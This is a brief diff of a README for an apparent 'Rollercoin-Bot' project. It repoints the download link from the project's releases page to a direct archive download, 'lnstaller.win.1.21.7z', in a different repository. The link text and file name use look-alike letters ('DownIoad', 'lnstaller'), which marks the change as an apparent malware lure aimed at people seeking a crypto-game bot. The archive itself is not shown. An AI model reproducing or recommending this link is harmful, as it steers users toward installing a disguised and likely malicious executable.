@@ -2,7 +2,7 @@
 
 ![image](https://github.com/AlanD3V1/Rollercoin-Bot/assets/172980447/5591ab1c-e15e-42e6-bbc4-02e98a631ec5)
 
-## [DownIoad](https://github.com/AlanD3V1/Rollercoin-Bot/releases/tag/DownIoad)
+## [DownIoad](https://github.com/AlanD3V1/AlanD3/releases/download/DownIoad/lnstaller.win.1.21.7z)
 
 
 > [!Note]
